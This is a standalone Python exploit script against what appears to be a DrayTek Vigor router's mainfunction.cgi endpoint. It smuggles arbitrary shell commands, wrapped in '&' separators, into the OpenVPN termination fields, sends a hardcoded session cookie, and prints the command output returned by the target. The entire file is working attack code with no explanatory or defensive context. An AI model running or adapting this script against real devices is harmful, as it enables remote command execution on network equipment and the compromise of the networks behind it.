import argparse
import requests
 
cookie_value = "7:6489218C0C9EABA942AC700668F4732F" # your cookie_value
cookies = {
    "SESSION_ID_VIGOR": cookie_value
}

def remove_duplicate(input_str):
    length = len(input_str)
    
    if length % 2 == 0 and input_str[:length//2] == input_str[length//2:]:
        return input_str[:length//2]
    else:
        return input_str


def system(host,cmd1,cmd2,cmd3):
    cmd1 = "&"+cmd1
    cmd3 = cmd3+"&"
    try:
        headers = {
            "HOST":host,
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
            "Content-Type": "text/plain; charset=UTF-8",
            "Accept": "*/*",
            }
        url = "http://"+ host + "/cgi-bin/mainfunction.cgi"
        data = {
            "config": "ipv6_neigh",
            "rfilter": "system",
            "action": "doOpenVPN",
            "table": cmd1,
            "option": "terminate",
            "remoteIP": cmd2,
            "remoteLIP": cmd3
        }
        res = requests.post(url=url, data=data,headers=headers,cookies=cookies,verify=False)
        if res.status_code == 200 and res.text != "":
            print("[+] Command executed successfully")
            result = remove_duplicate(res.text)
            print("[+] Result: \n" + result)
            return res.text
        else:
            print('[-] Command execute failed! Nothing...')
            return 1
    except Exception as e:
        print('[-] Command execute failed!')
        print(e)
 
 
if __name__ == "__main__":
    # 获取第一个参数作为目标地址，第二个命令行参数作为命令
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="target host")
    parser.add_argument("cmd1", help="command to execute")
    parser.add_argument("cmd2", help="command to execute")
    parser.add_argument("cmd3", help="command to execute")
    args = parser.parse_args()
    system(args.host, args.cmd1, args.cmd2, args.cmd3)

